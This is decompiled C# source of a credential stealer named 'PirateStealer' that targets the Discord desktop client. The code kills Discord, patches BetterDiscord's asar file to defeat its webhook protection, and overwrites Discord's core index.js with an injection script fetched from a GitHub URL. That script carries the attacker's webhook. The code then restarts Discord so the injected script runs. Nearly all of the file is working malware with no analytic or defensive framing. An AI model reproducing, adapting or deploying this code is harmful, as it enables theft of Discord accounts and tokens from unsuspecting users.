using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security;
using System.Security.Permissions;

namespace PirateStealer

{
    // Token: 0x02000002 RID: 2
    internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x000020C0 File Offset: 0x000002C0
		private static void Main(string[] args)
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + Environment.UserName;
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.Contains("iscord"))
				{
					process.Kill();
				}
			}
			if (Program.BetterDiscordExists())
			{
				foreach (string text in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BetterDiscord\\data"))
				{
					if (text.EndsWith("betterdiscord.asar"))
					{
						try
						{
							Program.RemoveBetterDiscordProtection(text);
						}
						catch (Exception)
						{
						}
					}
				}
			}
			foreach (string text2 in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)))
			{
				if (text2.Contains("Discord"))
				{
					foreach (string path2 in Directory.GetDirectories(text2))
					{
						if (Directory.GetDirectories(text2).Count<string>() > 0)
						{
							foreach (string text3 in Directory.GetDirectories(path2))
							{
								if (text3.Contains("app-"))
								{
									string[] directories3 = Directory.GetDirectories(text3);
									for (int l = 0; l < directories3.Length; l++)
									{
										foreach (string text4 in Directory.GetDirectories(directories3[l]))
										{
											if (text4.Contains("discord_desktop_core"))
											{
												try
												{
													Directory.CreateDirectory(text4 + "\\BTW");
												}
												catch (Exception)
												{
												}
												foreach (string text5 in Directory.GetFiles(text4))
												{
													if (text5.Contains("index.js"))
													{
														File.WriteAllText(text5, new WebClient().DownloadString("https://raw.githubusercontent.com/Stanley-PirateStealer/PirateStealer-GitHub/main/injection/injection").Replace("%WEBHOOK_LINK%", Settings.Webhook));
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			foreach (string text6 in Directory.GetDirectories(path))
			{
				if (text6.Contains("Discord"))
				{
					foreach (string path3 in Directory.GetDirectories(text6))
					{
						if (Directory.GetDirectories(text6).Count<string>() > 0)
						{
							foreach (string text7 in Directory.GetDirectories(path3))
							{
								if (text7.Contains("app-"))
								{
									string[] directories5 = Directory.GetDirectories(text7);
									for (int num = 0; num < directories5.Length; num++)
									{
										foreach (string text8 in Directory.GetDirectories(directories5[num]))
										{
											if (text8.Contains("discord_desktop_core"))
											{
												try
												{
													Directory.CreateDirectory(text8 + "\\BTW");
												}
												catch (Exception)
												{
												}
												foreach (string text9 in Directory.GetFiles(text8))
												{
													if (text9.Contains("index.js"))
													{
														File.WriteAllText(text9, new WebClient().DownloadString("https://raw.githubusercontent.com/Stanley-PirateStealer/PirateStealer-GitHub/main/injection/injection").Replace("%WEBHOOK_LINK%", Settings.Webhook));
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc");
			for (int num2 = 0; num2 < files2.Length; num2++)
			{
				Process.Start(files2[num2]);
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000024AC File Offset: 0x000006AC
		private static void RemoveBetterDiscordProtection(string betterdiscordpath)
		{
			string hex = "6170692f776562686f6f6b73";
			string hex2 = "7374616e6c65796973676f64";
			bool replaceAllInstances = true;
			if (File.Exists(betterdiscordpath))
			{
				PermissionSet permissionSet = new PermissionSet(PermissionState.None);
				FileIOPermission perm = new FileIOPermission(FileIOPermissionAccess.Write, betterdiscordpath);
				permissionSet.AddPermission(perm);
				if (permissionSet.IsSubsetOf(AppDomain.CurrentDomain.PermissionSet))
				{
					byte[] array = File.ReadAllBytes(betterdiscordpath);
					byte[] array2 = hex.HexStringToBytes();
					byte[] array3 = hex2.HexStringToBytes();
					if (array2 != null && array2.Length != 0 && array3 != null && array3.Length == array2.Length && array != null && array.Length >= array2.Length && Program.ReplaceBytes(ref array, array2, array3, replaceAllInstances) > 0)
					{
						File.WriteAllBytes(betterdiscordpath, array);
					}
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002058 File Offset: 0x00000258
		private static bool BetterDiscordExists()
		{
			return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BetterDiscord\\data");
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000254C File Offset: 0x0000074C
		private static int ReplaceBytes(ref byte[] inBytes, byte[] matchBytes, byte[] replaceBytes, bool replaceAllInstances = false)
		{
			int num = matchBytes.Length;
			int num2 = 0;
			int num3 = 0;
			for (int i = 0; i < inBytes.Length; i++)
			{
				if (inBytes[i] == matchBytes[num2])
				{
					num2++;
					if (num2 == num)
					{
						Program.ReplaceByteRange(ref inBytes, replaceBytes, i - (num2 - 1));
						num3++;
						if (!replaceAllInstances)
						{
							return 1;
						}
						num2 = 0;
					}
				}
				else if (num2 > 0)
				{
					num2 = ((inBytes[i] == matchBytes[0]) ? 1 : 0);
				}
			}
			return num3;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000025B0 File Offset: 0x000007B0
		public static void ReplaceByteRange(ref byte[] bytes, byte[] replaceBytes, int start)
		{
			for (int i = 0; i < replaceBytes.Length; i++)
			{
				bytes[start + i] = replaceBytes[i];
			}
		}

		// Token: 0x02000003 RID: 3
		[Flags]
		private enum ExitCodes
		{
			// Token: 0x04000002 RID: 2
			Success = 0,
			// Token: 0x04000003 RID: 3
			NotEnoughArguments = -1,
			// Token: 0x04000004 RID: 4
			TargetFileNotFound = -2,
			// Token: 0x04000005 RID: 5
			AdministrativeRightsRequired = -4,
			// Token: 0x04000006 RID: 6
			MatchAndReplaceLengthMismatch = -8
		}
	}
}
